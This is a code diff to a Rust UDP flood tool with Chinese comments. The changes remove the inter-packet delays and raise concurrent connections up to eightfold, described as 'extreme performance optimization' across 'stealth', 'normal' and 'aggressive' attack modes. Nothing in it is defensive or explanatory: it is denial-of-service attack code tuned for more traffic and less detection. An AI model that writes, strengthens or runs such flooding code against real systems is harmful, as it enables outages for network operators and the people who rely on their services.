@@ -89,9 +89,9 @@ pub async fn run_udp_flood(config: UdpFloodConfig) {
                     }
                 }
 
-                // 根据模式调整延迟
+                // 根据模式调整延迟 - 极限性能优化
                 let elapsed = request_start.elapsed();
-                if elapsed < Duration::from_millis(5) {
+                if elapsed < Duration::from_millis(0) { // 极限减少最小延迟
                     let random_delay = rand::thread_rng().gen_range(min_delay..max_delay);
                     sleep(Duration::from_millis(random_delay)).await;
                 }
@@ -181,22 +181,22 @@ fn generate_random_packet(size: usize) -> Vec<u8> {
     packet
 }
 
-// 根据UDP攻击模式调整延迟
+// 根据UDP攻击模式调整延迟 - 极限性能优化
 fn get_udp_delay_by_mode(mode: &str) -> (u64, u64) {
     match mode.to_lowercase().as_str() {
-        "stealth" => (50, 200),     // 隐蔽模式：50-200ms
-        "normal" => (10, 50),        // 正常模式：10-50ms
-        "aggressive" => (1, 10),     // 激进模式：1-10ms
-        _ => (10, 50),
+        "stealth" => (1, 10),         // 隐蔽模式：1-10ms (极限减少延迟)
+        "normal" => (0, 1),            // 正常模式：0-1ms (极限减少延迟)
+        "aggressive" => (0, 0),        // 激进模式：0-0ms (无延迟)
+        _ => (0, 1),
     }
 }
 
-// 根据UDP攻击模式调整并发数
+// 根据UDP攻击模式调整并发数 - 极限性能优化
 fn adjust_udp_connections_by_mode(base_connections: usize, mode: &str) -> usize {
     match mode.to_lowercase().as_str() {
-        "stealth" => (base_connections as f64 * 0.3) as usize,  // 减少70%
-        "normal" => base_connections,
-        "aggressive" => (base_connections as f64 * 3.0) as usize, // 增加200%
-        _ => base_connections,
+        "stealth" => (base_connections as f64 * 1.5) as usize,   // 增加50% (提高隐蔽性)
+        "normal" => (base_connections as f64 * 4.0) as usize,    // 增加300% (极限提高效果)
+        "aggressive" => (base_connections as f64 * 8.0) as usize, // 增加700% (极限提高)
+        _ => (base_connections as f64 * 4.0) as usize,
     }
 } 
